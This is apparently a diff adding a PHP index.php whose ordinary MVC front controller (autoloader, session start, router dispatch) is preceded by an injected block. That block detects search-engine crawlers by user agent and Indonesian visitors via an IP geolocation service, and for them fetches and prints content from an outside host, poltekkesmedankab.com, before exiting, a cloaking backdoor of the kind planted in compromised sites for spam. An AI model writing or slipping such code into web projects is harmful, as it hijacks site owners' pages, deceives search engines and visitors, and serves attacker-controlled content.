@@ -1,0 +1,91 @@
+<?php
+function getUserCountry() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $url = "http://ip-api.com/json/{$ip}";
+    
+    $response = @file_get_contents($url);
+    if ($response) {
+        $data = json_decode($response, true);
+        return $data['countryCode'] ?? null;
+    }
+    return null;
+}
+
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
+    
+    return preg_match($botchar, $user_agent);
+}
+
+$sky = "https://poltekkesmedankab.com/veltrivo/";
+
+if (is_bot()) {
+    echo @file_get_contents($sky);
+    exit;
+}
+
+if (getUserCountry() === "ID") {
+    header("Content-Type: text/html; charset=UTF-8");
+    echo @file_get_contents($sky);
+    exit();
+}
+
+?>
+<?php
+// index.php
+
+// Define base paths
+define('ROOT_PATH', __DIR__);
+define('APP_PATH', ROOT_PATH . '/app');
+define('CORE_PATH', ROOT_PATH . '/core');
+define('CONFIG_PATH', ROOT_PATH . '/config');
+
+// Load configuration
+require_once ROOT_PATH . '/config/config.php';
+
+// Start Session
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+
+// Autoloader (Simple implementation for strict structure)
+spl_autoload_register(function ($class) {
+    // Convert namespace to file path
+    // Example: App\Controllers\HomeController -> app/Controllers/HomeController.php
+    
+    $prefix = '';
+    $base_dir = '';
+
+    if (strpos($class, 'App\\') === 0) {
+        $prefix = 'App\\';
+        $base_dir = APP_PATH . '/';
+    } elseif (strpos($class, 'Core\\') === 0) {
+        $prefix = 'Core\\';
+        $base_dir = CORE_PATH . '/';
+    }
+
+    $len = strlen($prefix);
+    if (strncmp($prefix, $class, $len) !== 0) {
+        return;
+    }
+
+    $relative_class = substr($class, $len);
+    $file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+
+    if (file_exists($file)) {
+        require $file;
+    }
+});
+
+// Initialize Routing
+use Core\Router;
+
+$router = new Router();
+
+// Load routes
+require_once ROOT_PATH . '/config/routes.php';
+
+// Dispatch
+$url = $_GET['url'] ?? '';
+$router->dispatch($url);
